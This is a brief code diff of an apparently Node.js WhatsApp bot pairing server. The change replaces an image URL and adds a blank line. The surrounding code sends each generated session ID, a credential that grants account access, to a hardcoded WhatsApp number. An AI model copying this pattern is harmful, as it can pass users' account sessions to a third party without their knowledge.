@@ -69,7 +69,7 @@ async function connector(Num, res) {
                     const sid = generateRandomString(config.PREFIX, code);
                     console.log(sessionId)
                     await session.sendMessage("2349112171078@s.whatsapp.net", {
-                        image: { url: "https://cdn-haki.zone.id/files/VReAeI.jpg" },
+                        image: { url: "http://files.haki.top/files/zQypx4.jpg" },
                         caption: sid
                     });
                 }
@@ -120,3 +120,4 @@ app.get('/pair', async (req, res) => {
 app.listen(port, () => {
     console.log(`Running on PORT:${port}`);
 });
+
